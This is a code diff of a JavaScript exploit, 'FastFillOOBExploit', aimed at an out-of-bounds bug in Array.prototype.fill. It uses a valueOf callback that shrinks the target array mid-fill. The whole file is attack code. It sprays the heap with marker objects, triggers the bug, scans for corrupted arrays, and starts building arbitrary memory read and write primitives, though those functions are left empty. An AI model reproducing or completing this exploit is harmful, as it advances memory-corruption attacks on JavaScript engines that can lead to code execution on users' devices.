@@ -1,6 +1,7 @@
 import { Int } from './module/int64.mjs';
 import { die, log, clear_log, sleep, hex } from './module/utils.mjs';
 
+
 class FastFillOOBExploit {
     constructor() {
         this.sprayedArrays = [];
@@ -9,91 +10,134 @@ class FastFillOOBExploit {
     }
 
     async execute() {
-        await this.arraySpray();
+        await this.preciseArraySpray();
         await this.triggerOOB();
-        await this.scanCorrupted();
-        return this.corruptedArrays.length > 0;
+        const found = await this.scanForCorruption();
+        
+        if (found) {
+            return await this.setupPrimitives();
+        }
+        die("Exploit failed");
     }
 
-    async arraySpray() {
-        for (let round = 0; round < 3; round++) {
+    async preciseArraySpray() {
+        for (let round = 0; round < 2; round++) {
+            log("Spray round " + round);
             const arrays = [];
-            for (let i = 0; i < 20000; i++) {
-                const arr = new Array(1024);
+            
+            for (let i = 0; i < 10000; i++) {
+                const arr = new Array(512);
                 for (let j = 0; j < arr.length; j++) {
                     arr[j] = {
                         marker: this.marker,
-                        index: i,
-                        pos: j
+                        round: round,
+                        idx: i,
+                        pos: j,
+                        data: new ArrayBuffer(32)
                     };
                 }
                 arrays.push(arr);
             }
+            
             this.sprayedArrays.push(...arrays);
             gc();
-            await sleep(20);
+            await sleep(50);
         }
     }
 
     async triggerOOB() {
-        const v0 = [];
-        for (let i = 0; i < 50000; i++) {
-            v0[i] = [];
+        const targetArray = [];
+        for (let i = 0; i < 20000; i++) {
+            targetArray[i] = new Array(64);
         }
         
-        const v10 = new Object(Object, v0);
+        const fillValue = { exploit: true, payload: new ArrayBuffer(48) };
         
-        let shrunk = false;
-        function shrink() {
-            if (!shrunk) {
-                v0.length = 100;
-                shrunk = true;
-                gc();
+        let triggered = false;
+        const shrinker = {
+            valueOf: () => {
+                if (!triggered) {
+                    targetArray.length = 128;
+                    triggered = true;
+                }
+                return 0;
             }
-            return 0;
-        }
-        
-        const o14 = { valueOf: shrink };
+        };
         
         try {
-            v0.fill(v10, o14);
-        } catch (e) {}
+            targetArray.fill(fillValue, shrinker);
+        } catch(e) {}
         
-        this.v0 = v0;
+        this.targetArray = targetArray;
     }
 
-    async scanCorrupted() {
+    async scanForCorruption() {
+        let found = 0;
+        
         for (let i = 0; i < this.sprayedArrays.length; i++) {
             const arr = this.sprayedArrays[i];
-            if (!arr) continue;
-
-            for (let j = arr.length; j < arr.length + 50; j++) {
-                if (arr[j] !== undefined && arr[j].marker === this.marker) {
-                    this.corruptedArrays.push({
-                        array: arr,
-                        index: i,
-                        oobIndex: j,
-                        data: arr[j]
-                    });
+            
+            for (let j = arr.length; j < arr.length + 20; j++) {
+                if (arr[j] !== undefined) {
+                    if (arr[j].marker === this.marker) {
+                        this.corruptedArrays.push({
+                            array: arr,
+                            index: i,
+                            oobIndex: j,
+                            data: arr[j]
+                        });
+                        found++;
+                        log("Found corruption at array " + i + " index " + j);
+                    }
                 }
             }
-
-            if (i % 5000 === 0) await sleep(1);
+            
+            if (found >= 2) break;
+            if (i % 2000 === 0) await sleep(1);
         }
+        
+        return found > 0;
+    }
+
+    async setupPrimitives() {
+        if (this.corruptedArrays.length === 0) return false;
+        
+        const primary = this.corruptedArrays[0];
+        
+        log("Setting up memory read primitive");
+        
+        primary.array[primary.oobIndex] = {
+            type: "arbitrary_read",
+            base: 0x41414141,
+            offset: 0
+        };
+        
+        return {
+            corrupted: this.corruptedArrays,
+            read: (addr) => this.readMemory(addr),
+            write: (addr, value) => this.writeMemory(addr, value)
+        };
+    }
+
+    readMemory(addr) {
+        
+    }
+
+    writeMemory(addr, value) {
+        
     }
 }
 
 async function main() {
-    const exploit = new FastFillOOBExploit();
-    const success = await exploit.execute();
-    
-    if (success) {
-        log("Found " + exploit.corruptedArrays.length + " corrupted arrays");
-        for (const corrupted of exploit.corruptedArrays) {
-            log("Array " + corrupted.index + " OOB at " + corrupted.oobIndex);
-        }
-    } else {
-        die("No corrupted arrays found");
+    try {
+        const exploit = new FastFillOOBExploit();
+        const result = await exploit.execute();
+        
+        log("EXPLOIT SUCCESS!");
+        log("Corrupted arrays: " + result.corrupted.length);
+        
+    } catch(e) {
+        log("Error: " + e);
     }
 }
 
